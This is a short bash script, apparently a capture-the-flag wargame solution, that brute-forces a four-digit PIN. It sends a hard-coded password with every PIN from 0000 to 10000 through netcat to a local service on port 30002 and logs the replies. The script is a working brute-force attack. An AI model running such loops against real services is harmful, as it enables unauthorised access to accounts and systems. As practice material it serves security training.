#!/bin/bash

pwd="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"

for pin in {0..10000}; do
    printf -v j "%s %04d" $pwd $pin
    echo "$j"
done | nc localhost 30002 >> out 2>&1
